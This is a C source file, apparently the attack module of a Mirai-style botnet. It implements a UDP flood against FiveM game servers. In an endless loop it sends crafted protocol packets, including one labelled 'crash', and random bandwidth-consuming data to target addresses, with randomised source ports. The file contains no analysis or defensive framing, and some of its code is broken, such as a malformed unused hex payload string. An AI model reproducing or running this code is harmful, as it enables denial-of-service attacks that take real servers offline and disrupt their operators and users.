#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <poll.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <pthread.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"

#define MAX_THREADS 100

static unsigned long int Q[4096], c = 362436;

char *hexPayload = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A";

char random_hex() {
    char hexs[] = {'\x0', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08', '\x09', '\x0a', '\x0b', '\x0c', '\x0d', '\x0e', '\x0f', '\x10', '\x11', '\x12', '\x13', '\x14', '\x15', '\x16', '\x17', '\x18', '\x19', '\x1a', '\x1b', '\x1c', '\x1d', '\x1e', '\x1f', '\x20', '\x21', '\x22', '\x23', '\x24', '\x25', '\x26', '\x27', '\x28', '\x29', '\x2a', '\x2b', '\x2c', '\x2d', '\x2e', '\x2f', '\x30', '\x31', '\x32', '\x33', '\x34', '\x35', '\x36', '\x37', '\x38', '\x39', '\x3a', '\x3b', '\x3c', '\x3d', '\x3e', '\x3f', '\x40', '\x41', '\x42', '\x43', '\x44', '\x45', '\x46', '\x47', '\x48', '\x49', '\x4a', '\x4b', '\x4c', '\x4d', '\x4e', '\x4f', '\x50', '\x51', '\x52', '\x53', '\x54', '\x55', '\x56', '\x57', '\x58', '\x59', '\x5a', '\x5b', '\x5c', '\x5d', '\x5e', '\x5f', '\x60', '\x61', '\x62', '\x63', '\x64', '\x65', '\x66', '\x67', '\x68', '\x69', '\x6a', '\x6b', '\x6c', '\x6d', '\x6e', '\x6f', '\x70', '\x71', '\x72', '\x73', '\x74', '\x75', '\x76', '\x77', '\x78', '\x79', '\x7a', '\x7b', '\x7c', '\x7d', '\x7e', '\x7f', '\x80', '\x81', '\x82', '\x83', '\x84', '\x85', '\x86', '\x87', '\x88', '\x89', '\x8a', '\x8b', '\x8c', '\x8d', '\x8e', '\x8f', '\x90', '\x91', '\x92', '\x93', '\x94', '\x95', '\x96', '\x97', '\x98', '\x99', '\x9a', '\x9b', '\x9c', '\x9d', '\x9e', '\x9f', '\xa0', '\xa1', '\xa2', '\xa3', '\xa4', '\xa5', '\xa6', '\xa7', '\xa8', '\xa9', '\xaa', '\xab', '\xac', '\xad', '\xae', '\xaf', '\xb0', '\xb1', '\xb2', '\xb3', '\xb4', '\xb5', '\xb6', '\xb7', '\xb8', '\xb9', '\xba', '\xbb', '\xbc', '\xbd', '\xbe', '\xbf', '\xc0', '\xc1', '\xc2', '\xc3', '\xc4', '\xc5', '\xc6', '\xc7', '\xc8', '\xc9', '\xca', '\xcb', '\xcc', '\xcd', '\xce', '\xcf', '\xd0', '\xd1', '\xd2', '\xd3', '\xd4', '\xd5', '\xd6', '\xd7', '\xd8', '\xd9', '\xda', '\xdb', '\xdc', '\xdd', '\xde', '\xdf', '\xe0', '\xe1', '\xe2', '\xe3', '\xe4', '\xe5', '\xe6', '\xe7', '\xe8', '\xe9', '\xea', '\xeb', '\xec', '\xed', '\xee', '\xef', '\xf0', '\xf1', '\xf2', '\xf3', '\xf4', '\xf5', '\xf6', '\xf7', '\xf8', '\xf9', '\xfa', '\xfb', '\xfc', '\xfd', '\xfe', '\xff'};

    int length = sizeof(hexs) / sizeof(hexs[0]);

    return rand() % (length + 1);
}

void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}

unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}

void attack_fivem(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    uint16_t port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 30120);
    uint16_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 4096);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    
    // FiveM Official Payloads
    unsigned char fivem_info[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x18, 0x00, 0x00, 0x00,
        0x69, 0x6E, 0x66, 0x6F, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    unsigned char fivem_connect[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x13, 0x00, 0x00, 0x00,
        0x63, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x69,
        0x6F, 0x6E, 0x00, 0x00, 0x00, 0x00
    };
    
    unsigned char fivem_heartbeat[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x0C, 0x00, 0x00, 0x00,
        0x68, 0x65, 0x61, 0x72, 0x74, 0x62, 0x65, 0x61, 0x74, 0x00
    };
    
    unsigned char fivem_resources[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x1F, 0x00, 0x00, 0x00,
        0x67, 0x65, 0x74, 0x5F, 0x72, 0x65, 0x73, 0x6F,
        0x75, 0x72, 0x63, 0x65, 0x73, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    unsigned char fivem_players[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x10, 0x00, 0x00, 0x00,
        0x70, 0x6C, 0x61, 0x79, 0x65, 0x72, 0x73, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    unsigned char fivem_rcon[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x0E, 0x00, 0x00, 0x00,
        0x72, 0x63, 0x6F, 0x6E, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    unsigned char fivem_crash[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    unsigned char fivem_status[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0x09, 0x00, 0x00, 0x00,
        0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    // Create UDP socket
    fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd == -1)
        return;
    
    // Socket optimization
    int yes = 1;
    int buffer_size = 32 * 1024 * 1024; // 32MB buffer
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    // Prepare targets
    for (i = 0; i < targs_len; i++) {
        if (port == 0xffff)
            targs[i].sock_addr.sin_port = htons(30120 + (rand_next() % 200));
        else
            targs[i].sock_addr.sin_port = htons(port);
        
        targs[i].sock_addr.sin_family = AF_INET;
        
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }
    
    // Main attack loop - MAX SPEED
    while (1) {
        for (i = 0; i < targs_len; i++) {
            // Change source port randomly for each packet
            if (sport == 0xffff) {
                struct sockaddr_in bind_addr;
                memset(&bind_addr, 0, sizeof(bind_addr));
                bind_addr.sin_family = AF_INET;
                bind_addr.sin_port = htons(rand_next() & 0xffff);
                bind_addr.sin_addr.s_addr = INADDR_ANY;
                bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
            }
            
            // Send ALL 8 payloads at maximum speed
            sendto(fd, fivem_info, sizeof(fivem_info), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_connect, sizeof(fivem_connect), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_heartbeat, sizeof(fivem_heartbeat), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_resources, sizeof(fivem_resources), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_players, sizeof(fivem_players), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_rcon, sizeof(fivem_rcon), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_crash, sizeof(fivem_crash), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            sendto(fd, fivem_status, sizeof(fivem_status), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            
            // Send random large data to consume bandwidth
            if (data_rand && data_len > 0) {
                char *rand_data = malloc(data_len);
                if (rand_data) {
                    rand_str(rand_data, data_len);
                    sendto(fd, rand_data, data_len, MSG_NOSIGNAL,
                           (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                    free(rand_data);
                }
            }
        }
        // No delay for maximum speed
    }
}
